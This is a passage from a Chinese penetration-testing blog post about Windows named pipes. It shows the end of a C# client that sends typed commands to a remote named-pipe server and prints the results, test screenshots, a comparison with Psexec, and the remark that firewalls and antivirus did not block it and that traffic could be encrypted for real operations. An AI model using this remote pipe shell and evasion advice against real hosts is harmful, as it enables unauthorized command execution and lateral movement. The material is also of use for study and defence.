"</span>);</span><br><span class="line">            <span class="keyword">var</span> input = Console.ReadLine();</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(input)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Encoding.Default.GetBytes(input);</span><br><span class="line">            pipeClient.Write(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line">            <span class="keyword">if</span> (input.ToLower() == <span class="string">"exit"</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">var</span> result = ReadMessage(pipeClient);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(Encoding.Default.GetString(result));</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4-3、测试结果"><a href="#4-3、测试结果" class="headerlink" title="4.3、测试结果"></a>4.3、测试结果</h3><p><img src="\image\【知识回顾】命名管道\blog_2019-10-26_21-41-09.png" alt=""></p>
+<p>注意：此时的操作，是根据当前 <code>Client</code> 的权限进行的。</p>
+<p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_11-47-54.png" alt=""></p>
+<p>抓包看看此时的网络情况。</p>
+<p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-36-47.png" alt=""></p>
+<p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-37-26.png" alt=""></p>
+<p>这整个过程与 <code>Psexec</code> 差不多一致，只是缺少了与  服务控制管理器（SCM） 进行通信的过程。整个过程中防火墙和反病毒程序无任何阻拦。如果要应用于实战中，可以将内容先进行加密在进行传输。</p>
+<p>这里再说一个关于平时常用的 <code>IPC$</code>。</p>
+<p><code>IPC</code> 中文翻译网络进程连接服务，也就是说这个是为 <strong>“进程”</strong> 间建立网络连接而存在的服务，说的再明确点就是：<code>IPC$</code> 是一个为 “各类进程” 建立网络通信连接而存在的服务。 </p>
+<p>那么，为什么 <code>SMB Beacon</code> 中，为什么不需要账号密码呢？这个问题留给你们探索！！！</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-use-named-pipes-for-network-interprocess-communication" target="_blank" rel="noopener">如何：使用命名管道进行网络进程间通信</a></p>
+<p><a href="https://www.cnblogs.com/HDK2016/p/9840989.html" target="_blank" rel="noopener">【C#】解析C#中管道流的使用</a></p>
+<p><a href="https://segmentfault.com/a/1190000003116875" target="_blank" rel="noopener">命名管道实践</a></p>
+<p><a href="https://github.com/malcomvetter/NamedPipes" target="_blank" rel="noopener">NamedPipes</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes</a> </p>
+<p><a href="https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/" target="_blank" rel="noopener">We don’t need powershell.exe</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>！坚持技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechatpay.jpg" alt="RcoIl WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/知识星球.jpeg" alt="RcoIl Alipay">
+          <p>知识星球</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>嘤嘤怪：</strong>
+      RcoIl
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://rcoil.me/2019/11/【知识回顾】命名管道/" title="【知识回顾】命名管道">https://rcoil.me/2019/11/【知识回顾】命名管道/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/知识回顾/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> 知识回顾</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/【域渗透】获取域内机器共享/" rel="next" title="【域渗透】获取域内机器共享">
+                <i class="fa fa-chevron-left"></i> 【域渗透】获取域内机器共享
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODE5NS80NzY4"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="RcoIl">
+          <p class="site-author-name" itemprop="name">RcoIl</p>
+           
+              <p class="site-description motion-element" itemprop="description">好吃懒做，还有就是皮肤比黄皮果还黄！</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">40</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">18</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/RcoIl" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rcoil@qq.com" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-fa fa-envelope-open"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://t.zsxq.com/i2zJI2V" target="_blank" title="知识星球">
+                  
+                    <i class="fa fa-fw fa-fa fa-battery-bolt"></i>
+                  
+                  知识星球
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+		
+		
+          <div class="feed-link motion-element">
+            <div id="days"></div>
+			<script language="javascript">
+			function show_date_time(){
+				window.setTimeout("show_date_time()", 1000);
+				BirthDay=new Date("09/01/2016 10:13:14");
+				today=new Date();
+				timeold=(today.getTime()-BirthDay.getTime());
+				sectimeold=timeold/1000
+				secondsold=Math.floor(sectimeold);
+				msPerDay=24*60*60*1000
+				e_daysold=timeold/msPerDay
+				daysold=Math.floor(e_daysold);
+				e_hrsold=(e_daysold-daysold)*24;
+				hrsold=setzero(Math.floor(e_hrsold));
+				e_minsold=(e_hrsold-hrsold)*60;
+				minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+				seconds=setzero(Math.floor((e_minsold-minsold)*60));
+				document.getElementById('days').innerHTML="本站已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分"+ seconds +" 秒";
+			}
+			function setzero(i){
+				if (i<10)
+				{i="0" + i};
+				return i;
+			}		
+			show_date_time();
+		</script>
+        </div>
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn/" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hacktech.cn/" title="Akkuman" target="_blank">Akkuman</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://rootrain.me/" title="rootrain" target="_blank">rootrain</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kerlinglovsec.lofter.com/" title="kerling" target="_blank">kerling</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.luolikong.vip/" title="Fire-ant" target="_blank">Fire-ant</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xnianq.cn/" title="xniang" target="_blank">xniang</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one/" title="nMask" target="_blank">nMask</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://cate4cafe.com/" title="cate4cafe" target="_blank">cate4cafe</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://52stu.me/" title="IversOn5" target="_blank">IversOn5</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hone.cool/" title="Hone" target="_blank">Hone</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://sharecast.bitcron.com/" title="sharecast" target="_blank">sharecast</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://scarletf.github.io/" title="ScarletF" target="_blank">ScarletF</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.lz1y.cn/" title="Lz1y" target="_blank">Lz1y</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-介绍"><span class="nav-text">0x00 介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Windows-防火墙行为分析"><span class="nav-text">0x01 Windows 防火墙行为分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-【知识回顾】命名管道"><span class="nav-text">0x02 【知识回顾】命名管道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-使用-C-实现"><span class="nav-text">0x03 使用 C#实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1、-测试服务端代码"><span class="nav-text">3.1、 测试服务端代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2、测试客户端代码"><span class="nav-text">3.2、测试客户端代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3、测试结果"><span class="nav-text">3.3、测试结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-shell-实现"><span class="nav-text">0x04 shell 实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1、服务端实现"><span class="nav-text">4.1、服务端实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2、客户端实现"><span class="nav-text">4.2、客户端实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3、测试结果"><span class="nav-text">4.3、测试结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考"><span class="nav-text">0x05 参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+<!--
+    <i class="fa fa-heart"></i>
+-->
+	<i class="fa fa-address-card-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RcoIl</span>
+</div>
+<!--
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-blind" aria-hidden="true"></i>本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-user-md" aria-hidden="true"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("KVNdpVifyFqJPx0bzSg6cN7z-gzGzoHsz", "vlNRwqLbdUTKC1W06gjYj0iG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
